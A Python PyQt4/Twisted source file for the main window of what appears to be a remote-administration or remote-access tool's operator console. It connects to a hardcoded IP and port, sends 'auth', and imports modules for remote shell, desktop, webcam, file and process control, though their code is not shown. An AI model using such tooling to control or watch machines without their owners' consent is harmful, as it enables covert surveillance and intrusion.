# -*- coding: utf-8 -*-

import sys
import socket
import os
import time
import threading
import hashlib
import string
import random

from PyQt4.QtGui import *
from PyQt4.QtCore import *

from ModeratorFactory import *
from libs import pygeoip
from libs.language import Translate
from ui import gui
from LogViewer import LogViewer
from libs.log_settings import LogSettings
from libs.settings import Config, Settings
from libs.data_transfer import data_receive, data_send, data_get
from modules.mexplorer import main as mexplorer
from modules.mshell import main as mshell
from modules.mprocesses import main as mprocesses
from modules.mscript import main as mscript
from modules.mdesktop import main as mdesktop
from modules.mwebcam import main as mwebcam

SERVER_HOST = '109.172.189.74'
SERVER_PORT = 1313

# Main Window
class MainDialog(QMainWindow, gui.Ui_MainWindow):
    def __init__(self, reactor, parent=None):
        super(MainDialog, self).__init__(parent)
        self.reactor = reactor
        self.setupUi(self)

        self.create_moderator()

        # Triggers
        self.connectButton.clicked.connect(self.on_connect_to_server)

    def create_moderator(self):
        self.moderator = SocketModeratorFactory(
            self.on_client_connect_success,
            self.on_client_connect_fail,
            self.on_client_receive)


    def on_connect_to_server(self):

        self.connection = self.reactor.connectTCP(SERVER_HOST, SERVER_PORT, self.moderator)
        self.send_to_server('auth')

    def on_client_connect_success(self):
        print 'Connected to server'

    def on_client_connect_fail(self, reason):
        # reason is a twisted.python.failure.Failure  object
        print 'cann\'t connect. reason: %s' % reason

    def on_client_receive(self, data):
        print 'received'
        print data
        self.send_to_server('auth')

    def send_to_server(self, message):
        self.moderator.send_msg(message)

#-------------------------------------------------------------------------------
if __name__ == "__main__":
    app = QApplication(sys.argv)
    try:
        import qt4reactor
    except ImportError:
        # Maybe qt4reactor is placed inside twisted.internet in site-packages?
        from twisted.internet import qt4reactor
    qt4reactor.install()

    from twisted.internet import reactor
    moderatWindow = MainDialog(reactor)
    moderatWindow.show()

    reactor.run()